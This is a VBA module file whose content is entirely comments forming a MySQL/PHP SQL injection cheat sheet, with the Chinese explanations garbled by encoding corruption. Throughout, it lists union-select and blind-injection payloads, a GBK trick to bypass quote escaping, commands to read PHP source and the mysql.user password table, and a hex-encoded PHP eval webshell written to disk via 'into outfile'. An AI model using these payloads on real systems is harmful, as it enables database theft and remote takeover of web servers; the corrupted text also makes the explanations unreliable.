Attribute VB_Name = "Module2"
Option Explicit

'ע�ͷ�: # �� % 23 �� --  �� /*
'
'magic_quotes_gpc = On           addslashes()���ˣ��� ' " \ null ת��  ����ǰ����Ϸ�б��
'PS: intval()         ���ڹ�����������
'register_globals = Off          �ر�ע��ȫ�ֱ���
'display_errors = Off            �رմ�����ʾ
'
'
'GBK���ֽ�ͻ��magic_quotes_gpc = On���� �� % f5' ���� ' �� ' ��� �\' ������ \'
'
'
'ʵ������
'���� id Ϊ�����ͣ����sql���Ϊ id='$id' ��ʹ�õ����ţ����ύ?id=1 and 1=1 ��?id=1 and 1=2 �������?id=1 ,��ȡ�ո�ǰ��Ĳ�����
'��ʱ��ʹ��?id=1' and 1=1# ��?id=1' and 1=2# ���ж��Լ�����SQL��䡣
'
'�鿴PHP������ʱ�����滻һЩ�ַ���<��������ҳ���޷��鿴���롣
'replace(load_file(HEX),char(60),char(32))
'union select 1,replace(load_file(HEX),char(60),char(32)),3
'char(60)��ʾ <
'char(32)��ʾ �ո�
'
'Illegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,IMPLICIT) for operation 'UNION'
'��ʾǰ����벻һ��
'unhex (Hex(����))
'union select 1,unhex(hex(load_file(HEX))),3
'
'
'@@hostname                               DATA��������
'@@version_compile_os                     �ж�ϵͳ����
'@@basedir                                ���ݿⰲװĿ¼
'@@datadir                                ���ݿ�洢Ŀ¼
'@@plugin_dir                             ���Ŀ¼·��
'@@group_concat_max_len                   group_concat()��󳤶�
'user()                                   ��ǰ�û�
'database()                               ��ǰ���ݿ�
'version()                                mysql�汾
'concat(�ֶ�1,0x7C,�ֶ�2,0x7C,�ֶ�N)      ���Ӷ������
'group_concat(�ֶ�)                       �г�������
'
'
'load_file(16�����ļ������ַ)            ��ȡ�ļ�
'дwebshell <?php @eval_r($_POST['c']);?>       PS:windows��ַ�� / ���� \\ ������ \ ���С�
' and 1=2 union select 1,0x3C3F70687020406576616C28245F504F53545B2763275D293B3F3E,3,..n into outfile '�ļ������ַ'
'
'
'
'select user,password,update_priv,file_priv from mysql.user          mysql.userΪ�û�ȫ��Ȩ��
'select * from mysql.db                                              mysql.dbΪ�û����ݿ����Ȩ��
'
'
' and (select count(*) from ���)>0
' and (select count(�ֶ�) from ���)>0
' and (select length(�ֶ�) from ��� limit N,1)>5
' and (select ascii(mid(�ֶ�,N,1)) from ��� limit N,1)>96



'php sql injector��ʱ�򣬺ܶ�����¶�����ʾһ��һ�е����ݣ�Ҫһ�εõ�ȫ�����ݻ��߱���Ǿ͵��ظ���Ρ�
'����group_concat����ʵ�ֽ�������һ����Ԫ���� (������һ��һ��)
'����:
'
'select group_concat(id,0x7c,name,0x7c,tel,0x5d) from g
'
'��ô���õ�:
'
'1|����|83023023],|����|13893232322],��..
'��ע�������ѯ�������һ�ж��У�����һ��һ�У�
'
'����ԭ����sqlע��ط�Ϊ:
'
'select name from userinfo where id=$id
'
'��ô������������:
'id=1 and 1=2 union selelct group_concat(id,0x7c,name,0x7c,tel,0x5d) from g
'��վ���ݾ�Ϊԭ����ת������ر������������ӣ�
'php mysqlע���һ�ֿ�����Чunion����select�����ݿ�����:http://www.webshell.cc/3415.html

